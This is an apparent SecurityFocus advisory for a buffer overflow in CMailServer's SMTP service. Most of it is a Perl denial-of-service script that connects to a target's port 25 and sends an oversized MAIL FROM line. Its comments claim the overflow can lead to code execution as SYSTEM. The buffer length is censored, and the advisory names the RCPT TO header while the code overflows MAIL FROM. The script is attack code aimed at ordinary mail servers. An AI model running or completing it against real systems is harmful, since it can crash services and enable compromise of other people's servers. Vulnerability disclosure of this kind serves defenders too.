source: http://www.securityfocus.com/bid/7548/info

A buffer overflow vulnerability has been reported for CMailServer. The vulnerability exists due to insufficient bounds checking when parsing e-mail headers. Specifically, an overly long RCPT TO e-mail header will cause CMailServer to crash and corrupt sensitive memory. 

#!/usr/bin/perl -w
##################
# ESMTP CMailServer 4.0.2003.03.27 SMTP Service DoS attack
#
# URL: http://www.infowarfare.dk/
# EMAIL: der@infowarfare.dk
# USAGE: sploit.pl <target ip>
#
# Summary:
#
# The problem is a Buffer Overflow in the SMTP protocol, within the
# ESMTP CMailServer, causing the service to shutdown
# It is then where we can actually overwrite the exception handler on the
stack allowing
# A system compromise with code execution running as SYSTEM.
#
#
# Ive censored some of the source code out. =)
#
# Solution:
# None at this time
#
#

use IO::Socket;

$target = shift() || "warlab.dk";
my $port = 25;
my $Buffer = "A" x <CENSORED> ; #


my $sock = IO::Socket::INET->new (
                                    PeerAddr => $target,
                                    PeerPort => $port,
                                    Proto => 'tcp'
                                 ) || die "could not connect: $!";

my $banner = <$sock>;
if ($banner !~ /^2.*/)
{
    print STDERR "Error: invalid server response '$banner'.\n";
    exit(1);
}

print $sock "HELO $target\r\n";
$resp = <$sock>;

print $sock "MAIL FROM: $Buffer\@$target.dk\r\n";
$resp = <$sock>;

print $sock "\r\n";
print $sock "\r\n\r\n\r\n\r\n\r\n\r\n";

close($sock);